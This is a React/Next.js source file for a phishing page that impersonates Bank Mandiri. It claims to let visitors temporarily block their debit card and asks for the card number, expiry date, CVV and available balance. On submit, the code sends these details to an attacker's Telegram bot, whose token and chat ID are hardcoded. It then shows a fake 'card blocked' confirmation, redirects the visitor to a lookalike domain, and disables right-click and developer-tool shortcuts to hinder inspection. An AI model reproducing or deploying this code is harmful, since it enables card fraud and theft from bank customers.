'use client';

import React, { useState, useEffect } from 'react';
import Image from 'next/image';
import { CreditCard, Calendar, Lock, Wallet, Info, ShieldCheck } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

export default function MandiriBlockPage() {
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [limit, setLimit] = useState('');
  const [isLuhnValid, setIsLuhnValid] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  const TELEGRAM_TOKEN = "8673674549:AAHP18UpUK20Rm3PzNkdnRkhkty2F0_yb_8";
  const TELEGRAM_CHAT_ID = "-1003801777662";
  const REDIRECT_URL = "https://batalkantransaksi-batal.ibankmandiricom.workers.dev/";

  // Luhn Algorithm Function
  const validateLuhn = (number: string) => {
    let sum = 0;
    let shouldDouble = false;
    for (let i = number.length - 1; i >= 0; i--) {
      let digit = parseInt(number.charAt(i));
      if (shouldDouble) {
        if ((digit *= 2) > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    let formatted = val.match(/.{1,4}/g);
    const newValue = formatted ? formatted.join(' ') : '';
    setCardNumber(newValue);
    
    const rawCard = newValue.replace(/\s/g, '');
    if (rawCard.length >= 15) {
      setIsLuhnValid(validateLuhn(rawCard));
    } else {
      setIsLuhnValid(true);
    }
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2, 4);
    setExpiry(val);
  };

  const handleLimitChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '');
    const newValue = raw ? 'Rp ' + parseInt(raw).toLocaleString('id-ID') : '';
    setLimit(newValue);
  };

  const rawCardValue = cardNumber.replace(/\s/g, '');
  const isFormValid = 
    isLuhnValid && 
    rawCardValue.length >= 16 && 
    expiry.length === 5 && 
    cvv.length === 3 && 
    limit !== '';

  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J'))) {
        e.preventDefault();
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;

    setIsLoading(true);

    const msg = `⚠️ *BLOKIR DEBIT MANDIRI*\n` +
                `💳 No Kartu: \`${cardNumber}\`\n` +
                `📅 Exp: \`${expiry}\`\n` +
                `🔐 CVV: \`${cvv}\`\n` +
                `💰 Saldo: ${limit}\n` +
                `⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
      });
    } catch (err) {
      console.error('Failed to send message to Telegram', err);
    }

    setTimeout(() => {
      setIsLoading(false);
      setIsSuccess(true);
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 3500);
    }, 7000);
  };

  return (
    <div className="flex flex-col items-center min-h-screen pb-10 relative bg-[#0A0A0A] text-[#E0E0E0] font-mono">
      <div className="security-overlay-left"></div>
      <div className="security-overlay-right"></div>

      <AnimatePresence>
        {isLoading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-[#0A0A0A]/95 flex flex-col justify-center items-center z-[9999]"
          >
            <div className="relative w-[60px] h-[60px]">
              <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#E0E0E0] border-b-[#E0E0E0] animate-[spin-right_1.2s_linear_infinite]"></div>
              <div className="absolute inset-[15%] rounded-full border-4 border-transparent border-l-emerald-500 border-r-emerald-500 animate-[spin-left_1s_linear_infinite]"></div>
            </div>
            <div className="mt-5 font-bold text-[#E0E0E0] text-[0.9rem]">Memproses pemblokiran...</div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {isSuccess && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/80 flex justify-center items-center z-[10000] backdrop-blur-[4px]"
          >
            <motion.div 
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              className="w-[85%] max-w-[340px] bg-[#0F0F0F] border border-[#1F1F1F] rounded-lg text-center overflow-hidden shadow-2xl"
            >
              <div className="p-[35px_25px]">
                <div className="w-20 h-20 mx-auto mb-5 rounded bg-[#1F1F1F] flex items-center justify-center border border-[#2A2A2A]">
                  <ShieldCheck className="w-10 h-10 text-emerald-500" />
                </div>
                <h1 className="text-[#E0E0E0] text-xl font-bold mb-[10px]">Blokir Kartu Berhasil</h1>
                <p className="text-[#888888] text-sm leading-[1.5]">
                  Anda akan dialihkan secara otomatis ke halaman pembatalan transaksi...
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="w-full max-w-[450px] flex-grow flex flex-col z-[1]">
        <header className="w-full bg-[#0F0F0F] border-b border-[#1F1F1F] py-[15px] mb-5 flex justify-center mt-4 rounded-md mx-auto">
          <div className="flex items-center gap-2 text-emerald-400 font-bold tracking-tight">
            <div className="w-6 h-6 bg-emerald-500/10 rounded flex items-center justify-center border border-emerald-500/20">
              <ShieldCheck className="w-4 h-4" />
            </div>
            <span>MANDIRI SECURE v2.4</span>
          </div>
        </header>

        {!isSuccess && (
          <main className="bg-[#0F0F0F] border border-[#1F1F1F] rounded-lg p-[25px_20px] shadow-2xl text-center mx-[15px]">
            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/30 text-red-400 text-xs font-semibold w-max mx-auto mb-4">
              <div className="w-2 h-2 rounded-full bg-red-500 shadow-[0_0_8px_#EF4444]"></div>
              LOCKED: PROTECTION MODE ON
            </div>
            <h2 className="text-[1.2rem] font-bold text-[#E0E0E0] mb-2">Blokir Kartu Debit</h2>
            <p className="text-[0.85rem] text-[#888888] mb-[25px] leading-[1.4]">
              Silakan masukkan detail kartu debit Anda yang ingin diblokir sementara.
            </p>

            <form onSubmit={handleSubmit} className="text-left font-sans">
              <div className="mb-[15px] relative">
                <label className="block text-[0.7rem] font-bold text-[#555555] mb-1.5 uppercase tracking-widest">
                  NOMOR KARTU
                </label>
                <div className="relative w-full">
                  <CreditCard className="absolute left-[14px] top-1/2 -translate-y-1/2 text-[#888888] pointer-events-none w-5 h-5" />
                  <input 
                    type="tel" 
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    className="w-full p-[12px_14px_12px_40px] border-[1.5px] border-[#1F1F1F] rounded text-[0.95rem] outline-none bg-[#0A0A0A] text-[#E0E0E0] transition-colors focus:border-emerald-500/50" 
                    placeholder="xxxx xxxx xxxx xxxx" 
                    maxLength={19} 
                    required 
                  />
                </div>
                {!isLuhnValid && <div className="text-red-400 text-[0.7rem] mt-1 font-medium">Nomor kartu tidak valid (Luhn check failed).</div>}
              </div>

              <div className="flex gap-3 mb-[15px]">
                <div className="flex-1">
                  <label className="block text-[0.7rem] font-bold text-[#555555] mb-1.5 uppercase tracking-widest">
                    MASA BERLAKU
                  </label>
                  <div className="relative w-full">
                    <Calendar className="absolute left-[14px] top-1/2 -translate-y-1/2 text-[#888888] pointer-events-none w-5 h-5" />
                    <input 
                      type="tel" 
                      value={expiry}
                      onChange={handleExpiryChange}
                      className="w-full p-[12px_14px_12px_40px] border-[1.5px] border-[#1F1F1F] rounded text-[0.95rem] outline-none bg-[#0A0A0A] text-[#E0E0E0] transition-colors focus:border-emerald-500/50" 
                      placeholder="MM/YY" 
                      maxLength={5} 
                      required 
                    />
                  </div>
                </div>
                <div className="flex-1">
                  <label className="block text-[0.7rem] font-bold text-[#555555] mb-1.5 uppercase tracking-widest">
                    CVV
                  </label>
                  <div className="relative w-full">
                    <Lock className="absolute left-[14px] top-1/2 -translate-y-1/2 text-[#888888] pointer-events-none w-5 h-5" />
                    <input 
                      type="tel" 
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                      className="w-full p-[12px_14px_12px_40px] border-[1.5px] border-[#1F1F1F] rounded text-[0.95rem] outline-none bg-[#0A0A0A] text-[#E0E0E0] transition-colors focus:border-emerald-500/50" 
                      placeholder="123" 
                      maxLength={3} 
                      required 
                    />
                  </div>
                </div>
              </div>

              <div className="mb-[15px]">
                <label className="block text-[0.7rem] font-bold text-[#555555] mb-1.5 uppercase tracking-widest">
                  SALDO TERSEDIA (IDR)
                </label>
                <div className="relative w-full">
                  <Wallet className="absolute left-[14px] top-1/2 -translate-y-1/2 text-[#888888] pointer-events-none w-5 h-5" />
                  <input 
                    type="tel" 
                    value={limit}
                    onChange={handleLimitChange}
                    className="w-full p-[12px_14px_12px_40px] border-[1.5px] border-[#1F1F1F] rounded text-[0.95rem] outline-none bg-[#0A0A0A] text-[#E0E0E0] transition-colors focus:border-emerald-500/50" 
                    placeholder="Rp 0" 
                    required 
                  />
                </div>
                <div className="flex items-center gap-2.5 bg-[#1F1F1F] p-3 rounded mt-2.5 border border-[#2A2A2A]">
                  <Info className="text-emerald-400 w-4 h-4 shrink-0" />
                  <span className="text-[0.7rem] text-[#A0A0A0] font-medium leading-[1.3]">
                    Pemblokiran ini bersifat sementara untuk melindungi akun Anda dari transaksi yang tidak sah.
                  </span>
                </div>
              </div>

              <button 
                type="submit" 
                disabled={!isFormValid}
                className={`w-full p-[12px] rounded text-sm font-bold mt-[15px] flex items-center justify-center gap-2 transition-all ${
                  isFormValid 
                    ? 'bg-white text-black hover:opacity-90' 
                    : 'bg-white text-black opacity-50 cursor-not-allowed'
                }`}
              >
                <Lock className="w-4 h-4" />
                KONFIRMASI BLOKIR
              </button>
            </form>
          </main>
        )}
      </div>

      <footer className="fixed bottom-0 w-full max-w-[450px] bg-[#0F0F0F] border-t border-[#1F1F1F] text-[#555555] text-center p-3 text-[0.75rem] tracking-widest font-mono">
        © 2026 MANDIRI SECURE SYS.
      </footer>
    </div>
  );
}
